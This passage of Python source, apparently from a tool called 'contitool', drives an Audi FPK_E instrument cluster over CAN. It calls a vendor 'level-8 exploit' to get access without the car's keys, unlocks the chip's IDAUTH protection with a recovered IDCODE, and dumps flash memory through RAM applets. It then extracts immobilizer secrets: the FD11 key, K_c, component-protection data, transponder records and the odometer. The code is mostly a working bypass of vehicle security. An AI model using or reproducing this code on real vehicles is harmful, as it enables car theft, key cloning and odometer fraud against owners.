    """Read `[source, source + length)` in an already-authenticated FPK_E session (`direct`, `bflash`, or `uflash`).

    When `use_stream=True` and `length >= 512`, attempts fast RSCAN0 `TM17` (`0x6F1`) streaming first and
    automatically falls back to the hardware-verified UDS `0x23` / `0xFEDF1A00` buffer method if the adapter drops frames.
    """
    if mode not in ("direct", "bflash", "uflash"):
        raise ValueError(f"Unsupported read mode: {mode}")
    if not (1 <= length <= FPKE_CFLASH_SIZE):
        raise ValueError(f"Read length must be 1..0x{FPKE_CFLASH_SIZE:X}, got {length}")

    reporter.reset_stage_timer()
    reporter.progress(0, length, unit="B", detail=label or mode)

    # 1. Try fast RSCAN0 TM17 streaming for bulk reads (>= 512 B, 8-byte aligned) when requested
    if use_stream and length >= 512 and source % 4 == 0 and length % 8 == 0:
        stream_payload = build_fpke_can_stream_applet(mode)
        stream_data = bytearray()
        try:
            with _applet_ram_guard(
                link,
                stream_payload,
                param_size=8,
                save_result=False,
                check_bfaselr=(mode == "bflash"),
            ) as guard_state:
                offset = 0
                while offset < length:
                    reporter.check_cancelled()
                    step = min(FPKE_STREAM_CHUNK_BYTES, length - offset)
                    part = _stream_chunk_via_rscan(link, source + offset, step)
                    stream_data.extend(part)
                    offset += len(part)
                    reporter.progress(offset, length, unit="B", detail=f"{label or mode} @ 0x{source + offset:08X}")
                marker = fpke_read_memory_0x23(link, FPKE_MARKER_ADDR, 4)
                if marker != b"SCAN":
                    raise RuntimeError(f"Stream applet marker mismatch: {marker.hex()}")
            if not guard_state.get("ram_restored"):
                raise RuntimeError("Failed to verify restored applet RAM after streaming")
            out_bytes = bytes(stream_data)
            return out_bytes, {
                "mode": mode,
                "protocol": "rscan_stream_0x6F1",
                "source": f"0x{source:08X}",
                "size": len(out_bytes),
                "chunk_size": FPKE_STREAM_CHUNK_BYTES,
                "requests": (length + FPKE_STREAM_CHUNK_BYTES - 1) // FPKE_STREAM_CHUNK_BYTES,
                "sha256": hashlib.sha256(out_bytes).hexdigest(),
                "payload_sha256": hashlib.sha256(stream_payload).hexdigest(),
                "ram_restored": True,
                "flash_writes": False,
            }
        except (TimeoutError, RuntimeError, can.CanError) as exc:
            reporter.warning(
                tr(
                    f"Быстрый поток 0x6F1 прерван ({exc}) — автоматический переход на штатное чтение UDS 0x23…",
                    f"Fast 0x6F1 stream interrupted ({exc}) — falling back to verified UDS 0x23 read…",
                )
            )
            reporter.reset_stage_timer()

    # 2. Verified UDS 0x23 (`direct`) or 256-byte `0xFEDF1A00` RAM-buffer applet (`bflash` / `uflash`)
    data = bytearray()
    if mode == "direct":
        eff_chunk = max(1, min(chunk_size, 500))
        chunks = partition_chunks(length, eff_chunk)
        for idx, sz in enumerate(chunks):
            reporter.check_cancelled()
            addr = source + idx * eff_chunk
            data.extend(fpke_read_memory_0x23(link, addr, sz))
            reporter.progress(len(data), length, unit="B", detail=f"{label or 'UDS 0x23'} @ 0x{addr:08X}")
            if idx % 16 == 0 or idx + 1 == len(chunks):
                reporter.can_log(
                    tr(
                        f"{label or 'UDS 0x23'}: прочитано {len(data):,} / {length:,} байт",
                        f"{label or 'UDS 0x23'}: read {len(data):,} / {length:,} bytes",
                    )
                )
        out = bytes(data)
        return out, {
            "mode": "direct",
            "protocol": "uds_0x23",
            "source": f"0x{source:08X}",
            "size": len(out),
            "chunk_size": eff_chunk,
            "requests": len(chunks),
            "sha256": hashlib.sha256(out).hexdigest(),
            "ram_restored": None,
            "flash_writes": False,
        }

    # Applet buffer mode (`bflash` or `uflash`) — 256 bytes per call via `0xFEDF1A00`
    buf_payload = FPKE_UFLASH_BUF_PAYLOAD if mode == "uflash" else FPKE_BFLASH_BUF_PAYLOAD
    buf_sha = FPKE_UFLASH_BUF_PAYLOAD_SHA256 if mode == "uflash" else FPKE_BFLASH_BUF_PAYLOAD_SHA256
    with _applet_ram_guard(
        link,
        buf_payload,
        param_size=4,
        save_result=True,
        check_bfaselr=(mode == "bflash"),
    ) as guard_state:
        for offset in range(0, length, 256):
            reporter.check_cancelled()
            sz = min(256, length - offset)
            addr = source + offset
            fpke_write_memory_0x3d(link, FPKE_SOURCE_PARAM, addr.to_bytes(4, "little"))
            fpke_write_memory_0x3d(link, FPKE_SAVED_RETURN, FPKE_APPLET_ENTRY.to_bytes(4, "little"))
            raw = fpke_read_memory_0x23(link, FPKE_RESULT_ADDR, FPKE_RESULT_SIZE)
            if raw[256:260] != b"SCAN":
                raise RuntimeError(f"Applet SCAN marker mismatch at 0x{addr:08X}: {raw[256:260].hex()}")
            data.extend(raw[:sz])
            reporter.progress(len(data), length, unit="B", detail=f"{label or mode} @ 0x{addr:08X}")
    if not guard_state.get("ram_restored"):
        raise RuntimeError("Failed to restore applet RAM or BFASELR")
    out = bytes(data)
    return out, {
        "mode": mode,
        "protocol": "applet_256b_0x23",
        "source": f"0x{source:08X}",
        "size": len(out),
        "chunk_size": 256,
        "requests": (length + 255) // 256,
        "sha256": hashlib.sha256(out).hexdigest(),
        "payload_sha256": buf_sha,
        "ram_restored": True,
        "flash_writes": False,
    }


# ────────────────────────────── High-Level Workflows ──────────────────────────────


def _read_verified_extra_area(
    link: FpkeCanLink,
    *,
    length: int = FPKE_EXTRA_SIZE,
    label: str = "Extra Area",
    attempts: int = 6,
    retry_delay: float = 0.30,
    reporter: OperationReporter = NULL_REPORTER,
) -> tuple[bytes, dict[str, Any]]:
    """Read RH850 Extra Area (`0xFF300000`) with automatic retry across transient `R_EEL_Handler` DataFlash P/E windows.

    While KL15 keepalive is active, the cluster's background `R_EEL_Handler` / `R_FDL_Handler` task periodically enters
    RV40F DataFlash Program/Erase mode (`FENTRYD = 1`) for ~50–300 ms. During that window `0xFF300000` temporarily
    aliases DataFlash (`0xFF200000` VB 0) instead of Extra Area, failing `validate_fpke_extra_area()`. Passive retry
    lets `R_EEL_Handler` finish cleanly without touching FACI registers.
    """
    last_exc: RuntimeError | None = None
    for attempt in range(1, max(1, attempts) + 1):
        reporter.check_cancelled()
        raw, meta = fpke_read_region_in_session(
            link,
            mode="bflash",
            source=FPKE_EXTRA_ADDR,
            length=length,
            use_stream=False,
            label=label,
            reporter=reporter,
        )
        try:
            if len(raw) >= 0x80:
                validate_fpke_extra_area(raw)
            if attempt > 1:
                meta["eel_contention_retries"] = attempt - 1
            return raw, meta
        except RuntimeError as exc:
            last_exc = exc
            if attempt >= attempts:
                break
            reporter.can_log(
                tr(
                    f"Фоновое обращение приборки к DataFlash (EEL) во время чтения Extra Area — повтор ({attempt}/{attempts - 1})…",
                    f"Cluster background DataFlash (EEL) activity during Extra Area read — retrying ({attempt}/{attempts - 1})…",
                )
            )
            end_wait = time.monotonic() + retry_delay
            while time.monotonic() < end_wait:
                reporter.check_cancelled()
                time.sleep(min(0.05, max(0.01, end_wait - time.monotonic())))
    assert last_exc is not None
    raise RuntimeError(
        tr(
            f"Не удалось считать корректную область Extra Area (0xFF300000) после {attempts} попыток ({last_exc}). Повторите чтение.",
            f"Failed to read valid Extra Area (0xFF300000) after {attempts} attempts ({last_exc}). Please retry.",
        )
    ) from last_exc


def _read_verified_dflash(
    link: FpkeCanLink,
    *,
    chunk_size: int = 500,
    use_stream: bool = False,
    label: str = "DataFlash",
    attempts: int = 3,
    retry_delay: float = 0.35,
    reporter: OperationReporter = NULL_REPORTER,
) -> tuple[bytes, dict[str, Any]]:
    """Read 64 KiB FPK_E DataFlash (`0xFF200000`), retrying if background `R_EEL_Handler` was mid-erase during the read."""
    raw = b""
    meta: dict[str, Any] = {}
    for attempt in range(1, max(1, attempts) + 1):
        reporter.check_cancelled()
        raw, meta = fpke_read_region_in_session(
            link,
            mode="direct",
            source=FPKE_DFLASH_ADDR,
            length=FPKE_DFLASH_SIZE,
            chunk_size=chunk_size,
            use_stream=use_stream,
            label=label,
            reporter=reporter,
        )
        if is_fpke_dflash(raw) or attempt >= attempts:
            if attempt > 1:
                meta["eel_contention_retries"] = attempt - 1
            return raw, meta
        reporter.can_log(
            tr(
                f"Фоновое обновление пула EEL во время чтения DataFlash — повторное чтение ({attempt}/{attempts - 1})…",
                f"Cluster background EEL pool update during DataFlash read — re-reading ({attempt}/{attempts - 1})…",
            )
        )
        end_wait = time.monotonic() + retry_delay
        while time.monotonic() < end_wait:
            reporter.check_cancelled()
            time.sleep(min(0.05, max(0.01, end_wait - time.monotonic())))
    return raw, meta


def can_fpke_full_read(
    port: str,
    *,
    interface: str = "slcan",
    session_dir: Path | None = None,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    dflash_chunk: int = 500,
    use_stream: bool = False,
    read_uflash: bool = False,
    read_bflash: bool = False,
    read_cflash: bool = False,
    cflash_bytes: bytes | None = None,
    ident: list[dict[str, str]] | None = None,
    keep_open: bool = False,
    bus: Any | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Complete single-session keyless read of Audi FPK_E SW 83A:

    1. Checks if vendor level 8 is already active on the open link; if not, establishes vendor level 8.
    2. Reads 256-byte Extra Area (`0xFF300000`) via `bflash` applet and validates security/OPBT0 words.
    3. Extracts candidate 16-byte `IDCODE` (`0xFF300050`), verifies it via hardware `IDAUTH` (`IDST 01 -> 00`),
       re-reads Extra Area with `IDAUTH` unlocked, and relocks `IDAUTH` with zeroes (`00 -> 01`).
    4. Reads full 64 KiB DataFlash (`0xFF200000..0xFF20FFFF`) and parses all EEL T01 secret structures
       (`FD11`, `K_c`, `IKA/CP`, `S0/S1`, transponders, coding, odometer).
    5. Optionally reads `UFlash` (32 KiB), `BFlash` (96 KiB), and/or `CFlash` (2 MiB) in the same session.
    6. Atomically writes `Dflash.bin`, `ExtraArea.bin`, `fpke_report.json`, and `fpke.can.log`.
       When `keep_open=True`, leaves the CAN connection and KL15 keepalive running for subsequent reads/procedures.
    """
    from contitool.can.workflows import default_session_dir

    verify_fpke_self_tests()
    out_dir = session_dir or default_session_dir(None, "fpke_read")
    out_dir.mkdir(parents=True, exist_ok=True)

    dflash_path = out_dir / "Dflash.bin"
    extra_path = out_dir / "ExtraArea.bin"
    report_path = out_dir / "fpke_report.json"
    can_log_path = out_dir / "fpke.can.log"

    total_steps = 4 + int(read_uflash) + int(read_bflash) + int(read_cflash)
    step_no = 1
    started = time.monotonic()

    with _managed_fpke_link(port, interface=interface, log_path=out_dir / "can.jsonl", bus=bus, keep_open=keep_open) as link:
        try:
            reporter.step(
                step_no,
                total_steps,
                tr("Проверка доступа уровня 8 по CAN", "Checking level 8 CAN access"),
            )
            exploit_info = fpke_ensure_level8(
                link,
                frame_delay=frame_delay,
                wake_seconds=wake_seconds,
                reporter=reporter,
            )

            step_no += 1
            reporter.step(
                step_no,
                total_steps,
                tr("Чтение конфигурации процессора и проверка IDCODE", "Reading MCU configuration & verifying IDCODE"),
            )
            initial_extra, initial_extra_meta = _read_verified_extra_area(
                link,
                label="Extra Area (initial)",
                reporter=reporter,
            )
            candidate_idcode = bytes(initial_extra[0x50:0x60])

            idst_before = fpke_read_memory_0x23(link, IDST_ADDR, 4)
            idst_after = fpke_idauth(link, candidate_idcode)
            if idst_after != b"\x00\x00\x00\x00":
                with contextlib.suppress(Exception):
                    fpke_idauth(link, b"\x00" * 16)
                raise RuntimeError(f"Hardware IDAUTH rejected candidate IDCODE: IDST={idst_after.hex()}")
            try:
                extra_bytes, extra_read_meta = _read_verified_extra_area(
                    link,
                    label="Extra Area",
                    reporter=reporter,
                )
            except RuntimeError:
                # `initial_extra` already passed structural validation and hardware IDAUTH accepted its IDCODE
                extra_bytes, extra_read_meta = initial_extra, dict(initial_extra_meta, fallback_to_initial=True)
            finally:
                idst_relock = fpke_idauth(link, b"\x00" * 16)
            validate_fpke_extra_area(extra_bytes)
            atomic_write(extra_path, extra_bytes)
            extra_info = analyze_fpke_extra_area(extra_bytes)
            idauth_info = {
                "candidate_idcode": candidate_idcode.hex(),
                "accepted": True,
                "idst_before": idst_before.hex(),
                "idst_after_idcode": idst_after.hex(),
                "idst_after_relock": idst_relock.hex(),
            }
            reporter.can_log(
                tr(
                    f"Extra Area считана и проверена: IDCODE={extra_info['idcode_spaced']} (IDAUTH принят: {idst_before.hex()} -> {idst_after.hex()} -> {idst_relock.hex()})",
                    f"Extra Area read & verified: IDCODE={extra_info['idcode_spaced']} (IDAUTH accepted: {idst_before.hex()} -> {idst_after.hex()} -> {idst_relock.hex()})",
                )
            )
            reporter.info(tr("Конфигурация процессора считана, IDCODE подтверждён", "MCU configuration read, IDCODE verified"))

            step_no += 1
            reporter.step(
                step_no,
                total_steps,
                tr("Чтение DataFlash (64 КБ)", "Reading DataFlash (64 KB)"),
            )
            dflash_bytes, dflash_read_meta = _read_verified_dflash(
                link,
                chunk_size=dflash_chunk,
                use_stream=use_stream,
                label="DataFlash",
                reporter=reporter,
            )
            atomic_write(dflash_path, dflash_bytes)

            opt_results: dict[str, Any] = {}
            if read_uflash:
                step_no += 1
                reporter.step(step_no, total_steps, tr("Чтение Uflash (32 КБ)", "Reading Uflash (32 KB)"))
                uf_bytes, uf_meta = fpke_read_region_in_session(
                    link,
                    mode="uflash",
                    source=FPKE_UFLASH_ADDR,
                    length=FPKE_UFLASH_SIZE,
                    use_stream=use_stream,
                    label="Uflash",
                    reporter=reporter,
                )
                uf_path = out_dir / "Uflash.bin"
                atomic_write(uf_path, uf_bytes)
                uf_meta["output"] = str(uf_path)
                opt_results["uflash"] = uf_meta

            if read_bflash:
                step_no += 1
                reporter.step(step_no, total_steps, tr("Чтение Bflash (96 КБ)", "Reading Bflash (96 KB)"))
                bf_bytes, bf_meta = fpke_read_region_in_session(
                    link,
                    mode="bflash",
                    source=FPKE_BFLASH_ADDR,
                    length=FPKE_BFLASH_SIZE,
                    use_stream=use_stream,
                    label="Bflash",
                    reporter=reporter,
                )
                bf_path = out_dir / "Bflash.bin"
                atomic_write(bf_path, bf_bytes)
                bf_meta["output"] = str(bf_path)
                opt_results["bflash"] = bf_meta

            if read_cflash:
                step_no += 1
                reporter.step(step_no, total_steps, tr("Чтение CodeFlash (2 МБ)", "Reading CodeFlash (2 MB)"))
                cf_bytes_read, cf_meta = fpke_read_region_in_session(
                    link,
                    mode="direct",
                    source=FPKE_CFLASH_ADDR,
                    length=FPKE_CFLASH_SIZE,
                    chunk_size=500,
                    use_stream=use_stream,
                    label="CodeFlash",
                    reporter=reporter,
                )
                cf_path = out_dir / "Cflash.bin"
                atomic_write(cf_path, cf_bytes_read)
                cf_meta["output"] = str(cf_path)
                opt_results["cflash"] = cf_meta
                cflash_bytes = cf_bytes_read

            step_no += 1
            reporter.step(
                step_no,
                total_steps,
                tr("Разбор данных DataFlash", "Analyzing DataFlash records"),
            )
            from contitool.core.fpke import extract_fpke_immo_passport

            secrets = analyze_fpke_dflash(dflash_bytes, cflash_bytes)
            immo_passport = extract_fpke_immo_passport(dflash_bytes, cflash_bytes)
            immo_passport_path = out_dir / "immo_passport.json"
            atomic_write(immo_passport_path, (json.dumps(immo_passport, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))

            report: dict[str, Any] = {
                "target": "Audi FPK_E SW 83A (83A920700E)",
                "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                "port": port,
                "interface": interface,
                "frame_delay_s": frame_delay,
                "can_only": True,
                "target_keys_used": False,
                "flash_writes": False,
                "ident": list(ident) if ident else [],
                "exploit": exploit_info,
                "idauth": idauth_info,
                "extra_area": extra_info,
                "extra": {
                    **extra_read_meta,
                    **extra_info,
                    "idauth": idauth_info,
                    "output": str(extra_path),
                },
                "dflash": {
                    **dflash_read_meta,
                    "first_16": dflash_bytes[:16].hex(),
                    "last_16": dflash_bytes[-16:].hex(),
                    "output": str(dflash_path),
                },
                "secrets": secrets,
                **opt_results,
                "wall_s": round(time.monotonic() - started, 3),
                "session_dir": str(out_dir),
                "report_path": str(report_path),
                "immo_passport_path": str(immo_passport_path),
                "can_log": str(can_log_path),
            }
            atomic_write(report_path, (json.dumps(report, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))
            reporter.success(
                tr(
                    f"Память блока считана за {report['wall_s']:.1f} с. Папка: {out_dir}",
                    f"ECU memory read in {report['wall_s']:.1f} s. Folder: {out_dir}",
                )
            )
            return report
        finally:
            link.save_can_log(can_log_path)


def can_fpke_read_region(
    port: str,
    *,
    mode: str = "dflash",
    interface: str = "slcan",
    source: int | None = None,
    length: int | None = None,
    chunk_size: int = 500,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    use_stream: bool = False,
    idcode_hex: str | None = None,
    fd11_key_hex: str | None = None,
    output_path: Path | None = None,
    session_dir: Path | None = None,
    keep_open: bool = False,
    bus: Any | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Read one specific FPK_E memory region (`dflash`, `cflash`, `extra`, `uflash`, `bflash`, `direct`, or `known-key`).

    Note: `mode='dflash'` with `use_stream=False` follows the strict `audi-83a-keyless-can-access.md` specification:
    only vendor level 8 + UDS `0x23`, with NO `0x3D` writes and NO RAM applets.
    When `keep_open=True` (or when an active session link is already open), checks if vendor level 8 is already unlocked
    and only runs the level-8 exploit if needed.
    """
    from contitool.can.workflows import default_session_dir

    verify_fpke_self_tests()
    presets: dict[str, tuple[str, int, int, str]] = {
        "dflash": ("direct", FPKE_DFLASH_ADDR, FPKE_DFLASH_SIZE, "Dflash.bin"),
        "cflash": ("direct", FPKE_CFLASH_ADDR, FPKE_CFLASH_SIZE, "Cflash.bin"),
        "extra": ("bflash", FPKE_EXTRA_ADDR, FPKE_EXTRA_SIZE, "ExtraArea.bin"),
        "uflash": ("uflash", FPKE_UFLASH_ADDR, FPKE_UFLASH_SIZE, "Uflash.bin"),
        "bflash": ("bflash", FPKE_BFLASH_ADDR, FPKE_BFLASH_SIZE, "Bflash.bin"),
        "direct": ("direct", FPKE_DFLASH_ADDR if source is None else source, FPKE_DFLASH_SIZE if length is None else length, "Memory.bin"),
        "known-key": ("direct", FPKE_DFLASH_ADDR if source is None else source, FPKE_DFLASH_SIZE if length is None else length, "Dflash.bin"),
    }
    if mode not in presets:
        raise ValueError(f"Unsupported FPK_E read mode: {mode}")
    hw_mode, def_src, def_len, def_name = presets[mode]
    eff_source = def_src if source is None else source
    eff_length = def_len if length is None else length

    out_dir = session_dir or (output_path.parent if output_path is not None else default_session_dir(None, f"fpke_{mode}"))
    out_dir.mkdir(parents=True, exist_ok=True)
    bin_path = output_path or (out_dir / def_name)
    report_path = bin_path.with_suffix(".json")
    can_log_path = bin_path.with_suffix(".can.log")

    idcode_bytes = bytes.fromhex(idcode_hex) if idcode_hex else None
    if idcode_bytes is not None and len(idcode_bytes) != 16:
        raise ValueError("--idcode must contain exactly 16 bytes (32 hex chars)")

    started = time.monotonic()
    with _managed_fpke_link(port, interface=interface, log_path=out_dir / "can.jsonl", bus=bus, keep_open=keep_open) as link:
        try:
            if mode == "known-key":
                if not fd11_key_hex:
                    raise ValueError("--fd11-key (16-byte hex) is required for known-key mode")
                key_bytes = bytes.fromhex(fd11_key_hex)
                link.start_keepalive()
                if wake_seconds > 0:
                    time.sleep(wake_seconds)
                reporter.step(1, 2, tr("Штатная авторизация FD11 (без эксплойта)", "Standard FD11 authentication (no exploit)"))
                fd11_id = fpke_authenticate_fd11(link, key_bytes, reporter=reporter)
                exploit_info: dict[str, Any] = {"exploit": False, "vendor_level": 6, "fd11_identifier": fd11_id}
            else:
                reporter.step(1, 2, tr("Проверка доступа уровня 8 по CAN", "Checking level 8 CAN access"))
                exploit_info = fpke_ensure_level8(
                    link,
                    frame_delay=frame_delay,
                    wake_seconds=wake_seconds,
                    reporter=reporter,
                )

            idauth_meta: dict[str, Any] | None = None
            if idcode_bytes is not None:
                idst_before = fpke_read_memory_0x23(link, IDST_ADDR, 4)
                idst_after = fpke_idauth(link, idcode_bytes)
                if idst_after != b"\x00\x00\x00\x00":
                    raise RuntimeError(f"IDCODE rejected by hardware IDAUTH: IDST={idst_after.hex()}")
                idauth_meta = {"idst_before": idst_before.hex(), "idst_after_idcode": idst_after.hex()}

            reporter.step(2, 2, tr(f"Чтение памяти 0x{eff_source:08X} ({eff_length:,} Б)", f"Reading memory 0x{eff_source:08X} ({eff_length:,} B)"))
            try:
                if eff_source == FPKE_EXTRA_ADDR and eff_length >= 0x80 and hw_mode == "bflash":
                    data, read_meta = _read_verified_extra_area(
                        link,
                        length=eff_length,
                        label=mode.upper(),
                        reporter=reporter,
                    )
                elif eff_source == FPKE_DFLASH_ADDR and eff_length == FPKE_DFLASH_SIZE and hw_mode == "direct":
                    data, read_meta = _read_verified_dflash(
                        link,
                        chunk_size=chunk_size,
                        use_stream=use_stream and mode != "known-key",
                        label=mode.upper(),
                        reporter=reporter,
                    )
                else:
                    data, read_meta = fpke_read_region_in_session(
                        link,
                        mode=hw_mode,
                        source=eff_source,
                        length=eff_length,
                        chunk_size=chunk_size,
                        use_stream=use_stream and mode != "known-key",
                        label=mode.upper(),
                        reporter=reporter,
                    )
            finally:
                if idcode_bytes is not None and idauth_meta is not None:
                    idst_relock = fpke_idauth(link, b"\x00" * 16)
                    idauth_meta["idst_after_relock"] = idst_relock.hex()

            if eff_source == FPKE_EXTRA_ADDR and len(data) >= 0x80:
                validate_fpke_extra_area(data)

            atomic_write(bin_path, data)
            report: dict[str, Any] = {
                "target": "Audi FPK_E SW 83A (83A920700E)",
                "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                "port": port,
                "interface": interface,
                "mode": mode,
                "can_only": True,
                "target_keys_used": mode == "known-key",
                "flash_writes": False,
                "access": exploit_info,
                "read": read_meta,
                "idauth": idauth_meta,
                "wall_s": round(time.monotonic() - started, 3),
                "output": str(bin_path),
                "report_path": str(report_path),
                "can_log": str(can_log_path),
                "session_dir": str(out_dir),
            }
            if eff_source == FPKE_EXTRA_ADDR and len(data) == FPKE_EXTRA_SIZE:
                report["extra_analysis"] = analyze_fpke_extra_area(data)
            elif eff_source == FPKE_DFLASH_ADDR and len(data) == FPKE_DFLASH_SIZE:
                report["secrets"] = analyze_fpke_dflash(data)

            atomic_write(report_path, (json.dumps(report, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))
            return report
        finally:
            link.save_can_log(can_log_path)


# ────────────────────────────── Cluster Diagnostic & Service Procedures ──────────────────────────────


def fpke_run_procedure(
    link: FpkeCanLink,
    proc_id: str,
    *,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Execute a diagnostic or bench procedure on `link` (keeping the CAN link open)."""
    link.start_keepalive()

    if proc_id == "ensure_level8":
        info = fpke_ensure_level8(link, frame_delay=frame_delay, wake_seconds=wake_seconds, reporter=reporter)
        reused = bool(info.get("reused_session"))
        msg = (
            tr("Доступ уровня 8 уже открыт.", "Access level 8 is already unlocked.")
            if reused
            else tr("Доступ уровня 8 успешно открыт.", "Access level 8 unlocked.")
        )
        reporter.success(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg, "details": info}

    if proc_id == "immo_status":
        from contitool.core.fpke import decode_fpke_02ed, decode_fpke_02ee

        link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
        st_02ed = link.request_uds(b"\x22\x02\xed", 0x62, timeout=2.0)[3:]
        st_02ef = link.request_uds(b"\x22\x02\xef", 0x62, timeout=2.0)[3:]
        st_03de = link.request_uds(b"\x22\x03\xde", 0x62, timeout=2.0)[3:]
        st_02e0 = link.request_uds(b"\x22\x02\xe0", 0x62, timeout=2.0)[3:]
        st_02ee: bytes | None = None
        with contextlib.suppress(Exception):
            st_02ee = link.request_uds(b"\x22\x02\xee", 0x62, timeout=1.5)[3:]

        d_02ed = decode_fpke_02ed(st_02ed)
        d_02ee = decode_fpke_02ee(st_02ee) if st_02ee else None
        mode_fam = d_02ed["life_state"]
        learned = d_02ed["learned_keys"]
        rem_keys = d_02ed["remaining_keys"]
        p_class_hex = d_02ed["power_class_hex"]
        cp_cnt = int.from_bytes(st_03de[:2], "big") if len(st_03de) >= 2 else 0
        lock_mins = list(st_02ef[:6])
        max_lock = max(lock_mins) if lock_mins else 0
        mode_txt = {
            1: tr("заводской режим", "virgin mode"),
            2: tr("рабочий режим", "normal mode"),
            3: tr("обучение ключей", "key learning mode"),
        }.get(mode_fam, tr(f"режим {mode_fam}", f"mode {mode_fam}"))
        lock_txt = (
            tr(f"таймер блокировки: {max_lock} мин", f"lockout timer: {max_lock} min")
            if max_lock > 0
            else tr("блокировок нет", "no lockouts")
        )
        pc_txt = f" • PowerClass: {p_class_hex}" if p_class_hex else ""
        msg = tr(
            f"Иммобилайзер: {mode_txt}{pc_txt} • Ключей: {learned} (свободно: {rem_keys}) • {lock_txt}",
            f"Immobilizer: {mode_txt}{pc_txt} • Keys: {learned} (free: {rem_keys}) • {lock_txt}",
        )
        if cp_cnt:
            msg += tr(f" • Счётчик CP: {cp_cnt}", f" • CP counter: {cp_cnt}")
        reporter.info(msg)
        return {
            "procedure": proc_id,
            "ok": True,
            "summary": msg,
            "mode_family": mode_fam,
            "power_class": d_02ed["power_class"],
            "power_class_hex": p_class_hex,
            "identity_counter": d_02ed["identity_counter"],
            "brand_id": d_02ed["brand_id"],
            "keyless_coded": d_02ed["keyless_coded"],
            "learned_keys": learned,
            "remaining_keys": rem_keys,
            "cp_counter": cp_cnt,
            "lockout_minutes": lock_mins,
            "challenge_r": st_02e0.hex().upper(),
            "slaves_02ee": d_02ee,
        }

    if proc_id == "read_dtc":
        from contitool.core import dtc as dtc_mod

        resp = link.request_uds(b"\x19\x02\xff", 0x59, timeout=3.0)
        active_dtcs: list[dict[str, Any]] = []
        stored_dtcs: list[dict[str, Any]] = []
        untested_count = 0
        # 59 02 <status_availability_mask> [DTC_hi DTC_mid DTC_lo status] * N
        for off in range(3, len(resp) - 3, 4):
            code = int.from_bytes(resp[off : off + 3], "big")
            status = resp[off + 3]
            grp = dtc_mod.group(status)
            if grp == "untested":
                untested_count += 1
                continue
            disp, desc = dtc_mod.describe_fpke(code)
            entry = {
                "code": f"0x{code:06X}",
                "code_int": code,
                "display": disp,
                "description": desc,
                "status": f"0x{status:02X}",
                "status_text": dtc_mod.status_text(status),
                "group": grp,
                "active": grp == "active",
            }
            if grp == "active":
                active_dtcs.append(entry)
            else:
                stored_dtcs.append(entry)

        dtcs = active_dtcs + stored_dtcs
        if dtcs:
            preview = "; ".join(f"{d['display']} — {d['description']}" for d in dtcs[:2])
            if len(dtcs) > 2:
                preview += tr(f" и ещё {len(dtcs) - 2}", f" and {len(dtcs) - 2} more")
            msg = tr(
                f"Найдено ошибок: {len(dtcs)} (активных: {len(active_dtcs)}, в памяти: {len(stored_dtcs)}) — {preview}",
                f"Found {len(dtcs)} fault(s) ({len(active_dtcs)} active, {len(stored_dtcs)} stored) — {preview}",
            )
            reporter.info(
                tr(
                    f"Найдено ошибок: {len(dtcs)} (активных: {len(active_dtcs)}, сохранённых: {len(stored_dtcs)})",
                    f"Found {len(dtcs)} fault(s) ({len(active_dtcs)} active, {len(stored_dtcs)} stored)",
                )
            )
            for d in dtcs:
                state_lbl = tr("активна", "active") if d["active"] else tr("в памяти", "stored")
                reporter.info(f"  [{state_lbl}] {d['display']} — {d['description']}")
        else:
            msg = tr("Ошибок в памяти блока нет.", "No trouble codes stored in the unit.")
            reporter.info(msg)
        return {
            "procedure": proc_id,
            "ok": True,
            "summary": msg,
            "dtcs": dtcs,
            "active_count": len(active_dtcs),
            "stored_count": len(stored_dtcs),
            "untested_count": untested_count,
        }

    if proc_id == "clear_dtc":
        link.request_uds(b"\x14\xff\xff\xff", 0x54, timeout=3.0)
        msg = tr("Ошибки блока сброшены.", "Fault codes cleared.")
        reporter.success(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg}

    if proc_id == "key_poll":
        link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
        r_start = link.request_uds(b"\x31\x01\x04\x3d\x00", 0x71, timeout=4.0)
        r_res = link.request_uds(b"\x31\x03\x04\x3d", 0x71, timeout=4.0)
        tail = r_res[4:] if len(r_res) > 4 else r_start[4:]
        if not tail or all(b == 0 for b in tail):
            msg = tr("Опрос считывателя ключей выполнен (транспондер не поднесён).", "Key reader polled (no transponder detected).")
        else:
            msg = tr(
                f"Опрос считывателя ключей выполнен (ответ: {tail.hex(' ').upper()}).",
                f"Key reader polled (response: {tail.hex(' ').upper()}).",
            )
        reporter.info(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg, "raw": r_res.hex()}

    if proc_id == "prog_precond":
        link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
        r_pre = link.request_uds(b"\x31\x01\x02\x03", 0x71, timeout=3.0)
        tail = r_pre[4:]
        msg = (
            tr("Условия программирования выполнены (блокировок нет).", "Programming preconditions met (clear).")
            if not tail or all(b == 0 for b in tail)
            else tr(
                f"Есть ограничения условий программирования: {tail.hex(' ').upper()}",
                f"Programming precondition restrictions: {tail.hex(' ').upper()}",
            )
        )
        reporter.info(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg, "raw": r_pre.hex()}

    if proc_id == "cp_activate":
        link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
        link.request_uds(bytes.fromhex("2f034803ff000000"), 0x6F, timeout=3.0)
        msg = tr("Защита компонентов принудительно активирована.", "Component protection forced active.")
        reporter.info(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg}

    if proc_id == "ecu_reset":
        link.request_uds(b"\x11\x02", 0x51, timeout=2.0)
        link.level8_active = False
        msg = tr("Команда отправлена — блок перезагружается.", "Reset command sent — unit is restarting.")
        reporter.info(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg}

